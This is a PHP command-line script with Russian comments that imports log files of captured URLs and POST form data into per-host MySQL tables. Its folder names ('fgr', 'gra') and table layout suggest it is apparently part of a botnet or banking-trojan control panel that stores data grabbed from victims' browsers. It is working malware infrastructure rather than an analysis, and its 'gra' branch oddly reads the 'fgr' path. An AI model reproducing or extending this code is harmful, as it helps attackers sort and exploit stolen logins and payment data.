#!/usr/bin/env php
<?php

set_time_limit(0);
error_reporting(-1);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '1024M');

function real_path($p){
	return str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
}

if(file_exists('../cache/dirs_import.json')) $dir = json_decode(file_get_contents('../cache/dirs_import.json'), true);
if(empty($dir['script']) || empty($dir['site']) || empty($dir['logs']) || empty( $dir['u']['5']) || empty($dir['u']['6']) || empty($dir['s']['5']) || empty($dir['s']['6'])){
	$dir = array();
	$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
	$dir['site'] = real_path($dir['script'] . '/../');
	$dir['logs'] = real_path($dir['site'] . '/logs/');
	$dir['u']['5'] = real_path($dir['logs'] . '/unnecessary/fgr/');
	$dir['u']['6'] = real_path($dir['logs'] . '/unnecessary/gra/');
	$dir['s']['5'] = real_path($dir['logs'] . '/save_logs/fgr/');
	$dir['s']['6'] = real_path($dir['logs'] . '/save_logs/gra/');
	file_put_contents($dir['site'] . 'cache/dirs_import.json', json_encode($dir));
}

ini_set('error_log', $dir['site'] . 'cache/error_import_file.txt');
function error_import_handler($code, $msg, $file, $line){
	global $dir;
	if($code != 8 && !strpos($file, 'geoip.inc')) file_put_contents($dir['site'] . 'cache/error_import_file.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
}
set_error_handler('error_import_handler');

if(!defined('IDOS')) define('IDOS', strtoupper(substr(PHP_OS, 0, 3)));

if(IDOS === 'WIN'){
	exec('"' . $dir['script'] . '/pv.exe" -pi php-*.exe');
}else{
	exec('/bin/env renice 0 -p ' . $MYPID);
}

include_once($dir['site'] . 'includes/config.php');
include_once($dir['site'] . 'includes/functions.php');
require_once($dir['site'] . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
$mysqli->settings["ping"] = true;

unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exit;
}

//$mysqli->settings["save_sql"] = $dir['site'] . 'cache/sql_history.txt';
//$mysqli->settings["save_prefix"] = $_SERVER['argv'][1];

if(empty($_SERVER['argv'][1])){
	error_log('EMPTY_FILE!',4);
	exit;
}

if(!file_exists($dir['logs'] . '/save_logs/fgr/' . $_SERVER['argv'][1]) && !file_exists($dir['logs'] . '/save_logs/gra/' . $_SERVER['argv'][1])){
	error_log('FILE_NOTFOUND!',4);
	exit;
}

if(file_exists($dir['logs'] . '/save_logs/fgr/' . $_SERVER['argv'][1])){
	$file = $dir['logs'] . '/save_logs/fgr/' . $_SERVER['argv'][1];
	$type = '5';
}elseif(file_exists($dir['logs'] . '/save_logs/gra/' . $_SERVER['argv'][1])){
	$file = $dir['logs'] . '/save_logs/fgr/' . $_SERVER['argv'][1];
	$type = '6';
}

function add_un($host, $host_pre, $data){
	global $mysqli, $type, $un;

	if(isset($un[$host_pre][100])){
		$un[$host_pre][] = "INSERT DELAYED INTO adm_unnecessary.bf_".$host_pre." (host, type, data) VALUES ('".$host."', '".$type."', '".$mysqli->real_escape_string($data)."')";
		array_walk($un[$host_pre], 'query_walk_un');
		unset($un[$host_pre]);
	}else{
		if(!is_array($un[$host_pre])) $un[$host_pre] = array();
		$un[$host_pre][] = "INSERT DELAYED INTO adm_unnecessary.bf_".$host_pre." (host, type, data) VALUES ('".$host."', '".$type."', '".$mysqli->real_escape_string($data)."')";
	}
}

function query_walk_un($item, $key){
	global $dir, $mysqli;
	$mysqli->query($item);
}

$un = array();

$ml = ini_get('memory_limit');
$ml = str_replace('M', '', $ml);
$ml = ($ml * 1024 * 1024);

$cb = 0;

$fs = filesize($file);

if($fs > ($ml / 4)){
	echo '1';
	$block_size = $ml / 8;
	$fs_max = ($fs + $block_size);
	$cb = $h = 0;
	$separator = "\r\n\r\n";
	
	$log = '';
	
	do{
		$log .= file_get_contents($file, false, null, $cb, $block_size);
		$h = strrpos($log, $separator);
		
		if($h !== false){
			$h += strlen($separator);
			
			$log = substr($log, 0, $h);
			
			$log = explode("\r\n\r\n", $log);
			
			foreach($log as $item){
				$item = explode("[,]", $item);
				$item[4] = explode('|POST:', $item[4], 2);
				$item[4][0] = trim($item[4][0], "\r\n");
				
				if(empty($item[4][0])) continue; // ссылка
				if(empty($item[4][1])) continue; // пост данные
				
				$item[4]['host'] = get_host($item[4][0]);
				$item[4]['host_pre'] = mb_substr($item[4]['host'], 0, 2, 'utf8');
				
				if(!file_exists($dir['site'] . 'cache/unnecessary/' . $item[4]['host_pre'])){
					$mysqli->query('CREATE TABLE IF NOT EXISTS adm_unnecessary.bf_'.$item[4]['host_pre'].' LIKE adm_unnecessary.bf_unnecessary');
					file_put_contents($dir['site'] . 'cache/unnecessary/' . $item[4]['host_pre'], true);
				}
				
				add_un($item[4]['host'], $item[4]['host_pre'], gzdeflate($item[0] . "[,]\r\n" . $item[1] . "[,]\r\n" . $item[2] . "[,]\r\n" . $item[3] . "[,]\r\n" . $item[4][0] . '|POST:' . $item[4][1] .  "[~]\r\n\r\n"));
				unset($item);
			}
						
			$cb += $h;
			$log = '';
		}else{
			$cb += $block_size;
		}
	}while($cb < $fs_max);
}else{
	echo '2';
	$cb = $fs;
		
	$log = file_get_contents($file);
	
	$log = explode("\r\n\r\n", $log);
	
	foreach($log as $item){
		$item = explode("[,]", $item);
		$item[4] = explode('|POST:', $item[4], 2);
		$item[4][0] = trim($item[4][0], "\r\n");
		
		if(empty($item[4][0])) continue; // ссылка
		if(empty($item[4][1])) continue; // пост данные
		
		$item[4]['host'] = get_host($item[4][0]);
		$item[4]['host_pre'] = mb_substr($item[4]['host'], 0, 2, 'utf8');
		
		if(!file_exists($dir['site'] . 'cache/unnecessary/' . $item[4]['host_pre'])){
			$mysqli->query('CREATE TABLE IF NOT EXISTS adm_unnecessary.bf_'.$item[4]['host_pre'].' LIKE adm_unnecessary.bf_unnecessary');
			file_put_contents($dir['site'] . 'cache/unnecessary/' . $item[4]['host_pre'], true);
		}
		
		add_un($item[4]['host'], $item[4]['host_pre'], gzdeflate($item[0] . "[,]\r\n" . $item[1] . "[,]\r\n" . $item[2] . "[,]\r\n" . $item[3] . "[,]\r\n" . $item[4][0] . '|POST:' . $item[4][1] .  "[~]\r\n\r\n"));
		unset($item);
	}
}

foreach($un as $a){
	array_walk($a, 'query_walk_un');
}

function start_index($row){
	global $mysqli;
	$mysqli->query('INSERT IGNORE INTO bf_unnecessary (`host`, `type`) SELECT DISTINCT `host`, `type` FROM `adm_unnecessary`.`'.$row->Tables_in_adm_unnecessary.'`');
}

$mysqli->query('SHOW TABLES FROM adm_unnecessary', null, 'start_index');

//

exit;

?>